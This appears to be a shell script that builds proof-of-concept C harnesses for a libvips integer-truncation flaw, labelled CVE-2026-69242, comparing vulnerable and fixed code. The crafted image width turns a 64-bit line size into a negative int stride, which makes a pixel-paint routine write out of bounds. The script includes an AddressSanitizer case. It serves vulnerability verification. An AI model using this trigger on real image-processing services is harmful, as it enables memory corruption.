#!/bin/sh
# Direct-call harness for CVE-2026-69242 / GHSA-9rwc-f68v-4482 (libvips).
# Verbatim pinned bytes from image.c v8.18.2 (vuln) and v8.18.3 (fixed) and
# from region.c v8.18.2; #line keeps the pinned source line numbers. No libvips
# build, TIFF loader, GLib, process, file, socket or network is involved.
set -eu
HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
SRC=$(CDPATH= cd -- "$HERE/../src" && pwd)
REG="$SRC/region.c.v8.18.2"
OUT="$HERE/evidence"
mkdir -p "$OUT"

gen_driver() { # variant
    v=$1
    if [ "$v" = vuln ]; then lo=656; hi=714; else lo=656; hi=718; fi
    sed -n "${lo},${hi} p" "$SRC/image.c.$v" > "$HERE/slice-sanity-$v.inc"
    # vips_region_image() header through the two bpl assignments; the closing
    # brace is generated, everything in between is verbatim.
    sed -n '599,640 p' "$REG" > "$HERE/slice-region-image.inc"
    sed -n '973,1008 p' "$REG" > "$HERE/slice-paint-pel.inc"

    cat > "$HERE/driver-$v.c" <<'HEADER'
/* Harness scaffolding only; the three #line blocks below are verbatim pinned
 * libvips bytes. Nothing here is a libvips build, TIFF loader or live image. */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <limits.h>

typedef unsigned char guchar;
typedef unsigned char VipsPel;
typedef unsigned int guint32;
typedef uint64_t guint64;
typedef int gboolean;
#define TRUE 1
#define FALSE 0
#define G_MAXSIZE ((guint64) 0xffffffffffffffffULL)

typedef struct { int unused; } VipsObject;
typedef struct { char text[512]; size_t len; } VipsBuf;
typedef struct { void (*sanity)(VipsObject *, VipsBuf *); } VipsObjectClass;

typedef enum { VIPS_FORMAT_NOTSET = -1, VIPS_FORMAT_UCHAR = 0, VIPS_FORMAT_DPCOMPLEX = 11 } VipsBandFormat;
typedef enum { VIPS_CODING_ERROR = -1, VIPS_CODING_NONE = 0, VIPS_CODING_LABQ = 2, VIPS_CODING_RAD = 3 } VipsCoding;
typedef enum { VIPS_INTERPRETATION_LAST = 99 } VipsInterpretation;
typedef enum { VIPS_IMAGE_SETBUF = 1, VIPS_IMAGE_PARTIAL = 5 } VipsImageType;
typedef enum { VIPS_DEMAND_STYLE_ANY = 4 } VipsDemandStyle;
typedef enum { VIPS_REGION_OTHER_IMAGE = 1, VIPS_REGION_WINDOW = 2 } VipsRegionType;

typedef struct {
    VipsObject parent;
    int Xsize, Ysize, Bands;
    VipsBandFormat BandFmt;
    VipsCoding Coding;
    VipsInterpretation Type;
    double Xres, Yres;
    VipsPel *data;
    VipsImageType dtype;
    int dhint;
    void *upstream, *downstream;
} VipsImage;
typedef struct { int left, top, width, height; } VipsRect;
typedef struct {
    VipsImage *im;
    VipsRect valid;
    VipsPel *data;
    int bpl;
    int invalid;
    VipsRegionType type;
    void *buffer, *window;
} VipsRegion;

#define VIPS_IMAGE(O) ((VipsImage *) (O))
#define VIPS_OBJECT_CLASS(c) (&(c))
#define VIPS_IMAGE_SIZEOF_ELEMENT(I) (vips_format_sizeof_unsafe((I)->BandFmt))
#define VIPS_IMAGE_SIZEOF_PEL(I) (VIPS_IMAGE_SIZEOF_ELEMENT(I) * (I)->Bands)
#define VIPS_IMAGE_SIZEOF_LINE(I) (VIPS_IMAGE_SIZEOF_PEL(I) * (I)->Xsize)
#define VIPS_IMAGE_SIZEOF_IMAGE(I) (VIPS_IMAGE_SIZEOF_LINE(I) * (I)->Ysize)
#define VIPS_IMAGE_ADDR(I, X, Y) \
    ((I)->data + (Y) * VIPS_IMAGE_SIZEOF_LINE(I) + (X) * VIPS_IMAGE_SIZEOF_PEL(I))
#define VIPS_REGION_LSKIP(R) ((size_t) ((R)->bpl))
#define VIPS_REGION_SIZEOF_PEL(R) (VIPS_IMAGE_SIZEOF_PEL((R)->im))
#define VIPS_REGION_ADDR(R, X, Y) \
    ((R)->data + ((Y) - (R)->valid.top) * VIPS_REGION_LSKIP(R) + \
        ((X) - (R)->valid.left) * VIPS_REGION_SIZEOF_PEL(R))
typedef void *(*VipsSListMap2Fn)(void *, void *, void *);
#define VIPS_FREEF(f, x) do { (void) (f); (x) = NULL; } while (0)
#define _(s) (s)

static int vips__leak = 0;
static int vips__global_lock = 0;
static VipsObjectClass vips_image_parent_class;
static guint64 vips_format_sizeof_unsafe(VipsBandFormat f)
{ return f == VIPS_FORMAT_UCHAR ? 1 : 16; }
static void g_mutex_unlock(int *m) { (void) m; }
static gboolean g_uint64_checked_mul(guint64 *out, guint64 a, guint64 b)
{
    if (a != 0 && b > UINT64_MAX / a) return FALSE;
    *out = a * b;
    return TRUE;
}
static void vips_buf_appends(VipsBuf *buf, const char *s)
{
    size_t n = strlen(s);
    if (buf->len + n + 1 < sizeof buf->text) {
        memcpy(buf->text + buf->len, s, n);
        buf->len += n;
        buf->text[buf->len] = '\0';
    }
}
static void vips_object_sanity_stub(VipsObject *o, VipsBuf *b)
{ (void) o; (void) b; }
static void *vips_image_sanity_upstream(VipsImage *u, VipsImage *d, void *b)
{ (void) u; (void) d; (void) b; return NULL; }
static void *vips_image_sanity_downstream(VipsImage *d, VipsImage *u, void *b)
{ return vips_image_sanity_upstream(u, d, b); }
static void g_mutex_lock(int *m) { (void) m; }
static int vips_slist_map2(void *l, void *f, void *a, void *b)
{ (void) l; (void) f; (void) a; (void) b; return 0; }
static void vips__region_check_ownership(VipsRegion *r) { (void) r; }
static void vips_error(const char *d, const char *f, ...) { (void) d; (void) f; }
static void vips_buffer_unref(void *p) { (void) p; }
static void vips_window_unref(void *p) { (void) p; }
static void *vips_window_take(void *w, VipsImage *im, int top, int height)
{ (void) im; (void) top; (void) height; return w; }
static void vips_rect_intersectrect(const VipsRect *a, const VipsRect *b, VipsRect *o)
{
    o->left = a->left > b->left ? a->left : b->left;
    o->top = a->top > b->top ? a->top : b->top;
    o->width = (a->left + a->width < b->left + b->width ?
        a->left + a->width : b->left + b->width) - o->left;
    o->height = (a->top + a->height < b->top + b->height ?
        a->top + a->height : b->top + b->height) - o->top;
    if (o->width < 0) o->width = 0;
    if (o->height < 0) o->height = 0;
}
static int vips_rect_isempty(const VipsRect *r) { return r->width <= 0 || r->height <= 0; }

#line 656 "image.c.VARIANT"
HEADER
    cat "$HERE/slice-sanity-$v.inc" >> "$HERE/driver-$v.c"
    cat >> "$HERE/driver-$v.c" <<'MID'

#line 599 "region.c.v8.18.2"
MID
    cat "$HERE/slice-region-image.inc" >> "$HERE/driver-$v.c"
    cat >> "$HERE/driver-$v.c" <<'MID2'
    return 0;
}

#line 973 "region.c.v8.18.2"
MID2
    cat "$HERE/slice-paint-pel.inc" >> "$HERE/driver-$v.c"
    cat >> "$HERE/driver-$v.c" <<'FOOTER'

/* ---------------- scenarios (harness scaffolding) ---------------- */
/* Xsize = (2^32 - 256)/4 = 1073741760, Bands = 4, UCHAR: the pinned sanity
 * check computes ls = 2^32 - 256, which fits guint64 but truncates to
 * (int) -256 when copied into the pinned int VipsRegion.bpl. */
#define CRAFT_XSIZE 1073741760
#define NEG_OFF (-256)

static VipsImage mkimage(VipsPel *data, int xsize, int ysize)
{
    VipsImage im;
    memset(&im, 0, sizeof im);
    vips_image_parent_class.sanity = vips_object_sanity_stub;
    im.Xsize = xsize;
    im.Ysize = ysize;
    im.Bands = 4;
    im.BandFmt = VIPS_FORMAT_UCHAR;
    im.Coding = VIPS_CODING_NONE;
    im.Type = (VipsInterpretation) 0;
    im.Xres = 1.0;
    im.Yres = 1.0;
    im.data = data;
    im.dtype = VIPS_IMAGE_SETBUF;
    im.dhint = VIPS_DEMAND_STYLE_ANY;
    return im;
}

static int rejects(VipsImage *im)
{
    VipsBuf b;
    memset(&b, 0, sizeof b);
    vips_image_sanity((VipsObject *) im, &b);
    return strstr(b.text, "dimension overflow") != NULL;
}

static void run_sanity(void)
{
    VipsBuf b;
    VipsImage im = mkimage(NULL, CRAFT_XSIZE, 2);
    VipsImage safe = mkimage(NULL, 64, 2);
    memset(&b, 0, sizeof b);
    vips_image_sanity((VipsObject *) &im, &b);
    printf("SANITY_CRAFT=%s\n", b.text[0] ? b.text : "-");
    memset(&b, 0, sizeof b);
    vips_image_sanity((VipsObject *) &safe, &b);
    printf("SANITY_SAFE=%s\n", b.text[0] ? b.text : "-");
}

static void run_chain(void)
{
    unsigned char *arena = calloc(1, 4096);
    unsigned char ink[4] = { 0x5a, 0x5a, 0x5a, 0x5a };
    VipsImage im = mkimage(arena + 512, CRAFT_XSIZE, 2);
    VipsRegion reg;
    VipsRect r = { 0, 0, 1, 2 };
    int i, rc, skip;
    memset(&reg, 0, sizeof reg);
    reg.im = &im;
    skip = rejects(&im);
    printf("CHAIN_REJECT=%d\n", skip);
    if (skip) {
        printf("CHAIN_SKIPPED=1\n");
    } else {
        rc = vips_region_image(&reg, &r);
        vips_region_paint_pel(&reg, &r, ink);
        printf("CHAIN RC=%d BPL=%d LS=%d WS=%d\n",
            rc, reg.bpl, (int) VIPS_REGION_LSKIP(&reg), 1 * 4);
        printf("CHAIN SINK=");
        for (i = 0; i < 8; i++) printf("%02x", arena[256 + i]);
        printf("\n");
    }
    free(arena);
}

#ifdef ASAN_CASE
static void run_underflow(void)
{
    unsigned char *small = (unsigned char *) malloc(4096);
    unsigned char ink[4] = { 0x5a, 0x5a, 0x5a, 0x5a };
    VipsImage im = mkimage(small + 255, CRAFT_XSIZE, 2);
    VipsRegion reg;
    VipsRect r = { 0, 0, 1, 2 };
    memset(&reg, 0, sizeof reg);
    reg.im = &im;
    if (rejects(&im)) {
        printf("UNDERFLOW_RUN=0\n");
    } else {
        vips_region_image(&reg, &r);
        printf("UNDERFLOW_RUN=1 BPL=%d\n", reg.bpl);
        vips_region_paint_pel(&reg, &r, ink);
    }
    free(small);
}
#endif

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    run_sanity();
    run_chain();
#ifdef ASAN_CASE
    run_underflow();
#endif
    return 0;
}
FOOTER
}

for v in vuln fixed; do gen_driver "$v"; done

build() { # compiler variant mode
    cc=$1; v=$2; mode=$3
    bin="bin-$cc-$v-$mode"
    flags="-O0 -g -Wall"
    if [ "$mode" = asan ]; then
        flags="$flags -fsanitize=address -fno-omit-frame-pointer -DASAN_CASE"
    fi
    # shellcheck disable=SC2086
    "$cc" $flags -o "$HERE/$bin" "$HERE/driver-$v.c"
}

for cc in gcc clang; do
    for v in vuln fixed; do
        for mode in plain asan; do build "$cc" "$v" "$mode"; done
    done
done

printf 'generated drivers and 8 binaries in %s\n' "$HERE"
